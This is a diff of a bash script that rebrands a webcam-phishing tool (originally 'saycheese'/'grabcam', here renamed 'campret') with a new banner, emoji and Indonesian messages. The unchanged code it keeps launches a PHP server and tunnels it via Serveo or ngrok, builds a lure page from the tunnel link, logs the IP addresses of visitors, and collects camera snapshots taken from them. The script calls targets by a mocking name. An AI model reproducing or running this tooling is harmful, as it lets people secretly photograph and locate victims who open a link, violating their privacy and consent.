@@ -12,29 +12,32 @@ trap 'printf "\n";stop' 2
 
 banner() {
 
-echo '
+echo -e '
 
-                             __
-                         __ /_/\___
-                        /__/[]\/__/|o-_
-                        |    _     ||   -_  
-                        |  ((_))   ||     -_
-                        |__________|/
-             ___  ____   __   ____   ___   __   _  _ 
-            / __)(  _ \ / _\ (  _ \ / __) / _\ ( \/ )
-           ( (_ \ )   //    \ ) _ (( (__ /    \/ \/ \
-            \___/(__\_)\_/\_/(____/ \___)\_/\_/\_)(_& v1.1 ' |lolcat
+ \e[35m.d8888b.        d8888888b     d888\e[0m 
+\e[35md88P  Y88b      d888888888b   d8888\e[0m 
+\e[35m888    888     d88P88888888b.d88888\e[0m 
+\e[35m888           d88P 888888Y88888P888\e[0m 
+\e[35m888          d88P  888888 Y888P 888\e[0m 
+\e[35m888    888  d88P   888888  Y8P  888\e[0m 
+\e[35mY88b  d88P d8888888888888   "   888\e[0m 
+ \e[35m"Y8888P" d88P     888888       888\e[0m 
+\e[1;34mVersion 1.0.0 Coded By Sadewa Dewa\e[0m
+ \e[31m____________ _____ _____\e[0m 
+\e[31m| ___ \ ___ \  ___|_   _|\e[0m
+\e[31m| |_/ / |_/ / |__   | |\e[0m  
+\e[31m|  __/|    /|  __|  | |\e[0m  
+\e[31m| |   | |\ \| |___  | |\e[0m  
+\e[31m\_|   \_| \_\____/  \_/\e[0m  '
 
                                                                                
 echo " "
-printf "      \e[1;77m v1.0 coded by github.com/thelinuxchoice/saycheese\e[0m \n"
-printf "          \e[1;77m v1.1 This reborn script by { Noob Hackers }\e[0m \n"
+printf "      \e[1;77m卂ㄩㄒ卄ㄖ尺 : 丂卂ᗪ乇山卂 ᗪ乇山卂\e[0m"
+printf "      \e[1;77mㄚㄖㄩㄒㄩ乃乇 : 爪尺 山卄5\e[0m"
+printf "      \e[1;77m千卂匚乇乃ㄖㄖҜ : 丂卂ᗪ乇山卂 ᗪ乇山卂\e[0m"
+printf "      \e[1;77m丨几丂ㄒ卂Ꮆ尺卂爪 : @丂卂ᗪ乇山卂_丂卂尺匚\e[0m"
 
 printf "\n"
-
-echo "      N073:> PLEASE TURN ON YOUR HOTSPOT 
-                   OR ELSE YOU DONT GET LINK....!"
-
 }
 
 stop() {
@@ -69,7 +72,7 @@ catch_ip() {
 
 ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
-printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+printf "\e[1;93m\e[0m\e[1;77mᕦ( ͡° ͜ʖ ͡°)ᕤ\e[0m\e[1;93m IP:\e[0m\e[1;77m %s\e[0m\n" $ip
 
 cat ip.txt >> saved.ip.txt
 
@@ -79,12 +82,12 @@ cat ip.txt >> saved.ip.txt
 checkfound() {
 
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Tekan Ctrl + C to exit...\e[0m\n"
 while [ true ]; do
 
 
 if [[ -e "ip.txt" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Si CAMpret masuk link!\n"
 catch_ip
 rm -rf ip.txt
 
@@ -93,7 +96,7 @@ fi
 sleep 0.5
 
 if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Pret! Pret! ni hasil fotonya...\e[0m\n"
 rm -rf Log.log
 fi
 sleep 0.5
@@ -107,7 +110,7 @@ server() {
 
 command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
 
-printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
+printf "\e[1;77m\e[0m\e[1;93m☆(☢‿☢)☆\e[0m\e[1;77m Start Serveo...\e[0m\n"
 
 if [[ $checkphp == *'php'* ]]; then
 killall -2 php > /dev/null 2>&1
@@ -123,12 +126,12 @@ $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:
 
 sleep 8
 fi
-printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
+printf "\e[1;77m\e[0m\e[1;33m☆(☢‿☢)☆\e[0m\e[1;77m Start php server... (localhost:3333)\e[0m\n"
 fuser -k 3333/tcp > /dev/null 2>&1
 php -S localhost:3333 > /dev/null 2>&1 &
 sleep 3
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
+printf '\e[1;93m\e[0m\e[1;77m🏩\e[0m\e[1;93m Hadiahkan untuk si CAMpret :\e[0m\e[1;77m %s\n' $send_link
 
 }
 
@@ -136,7 +139,7 @@ printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $s
 payload_ngrok() {
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-sed 's+forwarding_link+'$link'+g' grabcam.html > index2.html
+sed 's+forwarding_link+'$link'+g' campret.html > index2.html
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 
 
@@ -150,7 +153,7 @@ echo ""
 else
 command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
 command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
-printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
+printf "\e[1;92m\e[0mᕕ( ͡° ͜ʖ ͡°)▄︻̷̿┻̿═━一\e[1;92m Download Ngorok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
@@ -178,15 +181,15 @@ fi
 fi
 fi
 
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
+printf "\e[1;92m\e[0m☆(☢‿☢)☆\e[1;92m Start php server...\n"
 php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
+printf "\e[1;92m\e[0m☆(☢‿☢)☆\e[1;92m Start ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;92m\e[0m🏩\e[1;92m Hadiahkan untuk si CAMpret :\e[0m\e[1;77m %s\e[0m\n" $link
 
 payload_ngrok
 checkfound
@@ -199,9 +202,9 @@ fi
 
 printf "\n"
 printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngorok\e[0m\n"
 default_option_server="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Pilih 1 atau 2 : \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
 if [[ $option_server -eq 1 ]]; then
 
@@ -211,7 +214,7 @@ start
 elif [[ $option_server -eq 2 ]]; then
 ngrok_server
 else
-printf "\e[1;93m [!] Invalid option!\e[0m\n"
+printf "\e[1;93m [!] Tidak ada pilihan!\e[0m\n"
 sleep 1
 clear
 start1
@@ -224,7 +227,7 @@ payload() {
 
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 
-sed 's+forwarding_link+'$send_link'+g' grabcam.html > index2.html
+sed 's+forwarding_link+'$send_link'+g' campret.html > index2.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 
 
@@ -233,9 +236,9 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 start() {
 
 default_choose_sub="Y"
-default_subdomain="grabcam$RANDOM"
+default_subdomain="sadewadewa$RANDOM"
 
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Pilih subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
 read choose_sub
 choose_sub="${choose_sub:-${default_choose_sub}}"
 if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
